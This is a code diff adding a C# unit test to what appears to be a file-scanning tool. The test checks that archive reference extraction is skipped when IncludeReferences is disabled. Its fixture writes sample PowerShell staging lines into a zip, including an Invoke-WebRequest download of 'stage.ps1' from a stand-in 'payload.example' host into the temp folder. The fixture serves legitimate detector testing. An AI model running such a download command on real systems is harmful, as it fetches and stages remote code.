@@ -237,6 +237,36 @@ public class ReferencesTests
     }
 
     [Fact]
+    public void Extract_ArchiveInnerReferences_Respect_IncludeReferences_False()
+    {
+        var p = Path.Combine(Path.GetTempPath(), "archive-inner-refs-disabled-" + Guid.NewGuid().ToString("N") + ".zip");
+        bool oldDeep = Settings.DeepContainerScanEnabled;
+        try
+        {
+            Settings.DeepContainerScanEnabled = true;
+            using (var fs = File.Create(p))
+            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
+            {
+                var entry = za.CreateEntry("bootstrap.txt");
+                using var writer = new StreamWriter(entry.Open());
+                writer.WriteLine("$u = 'https://payload.example/stage.ps1'");
+                writer.WriteLine("$s = '\\\\fileserver\\drop\\stage.ps1'");
+                writer.WriteLine("Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\stage.ps1");
+            }
+
+            var a = FileInspector.Analyze(p, new FileInspector.DetectionOptions { IncludeReferences = false });
+            var refs = a.References ?? Array.Empty<Reference>();
+
+            Assert.Empty(refs);
+        }
+        finally
+        {
+            Settings.DeepContainerScanEnabled = oldDeep;
+            try { File.Delete(p); } catch { }
+        }
+    }
+
+    [Fact]
     public void Extract_NestedArchiveInnerScriptSignals_Are_Promoted_To_OuterArchive()
     {
         var outer = Path.Combine(Path.GetTempPath(), "archive-nested-inner-signals-" + Guid.NewGuid().ToString("N") + ".zip");
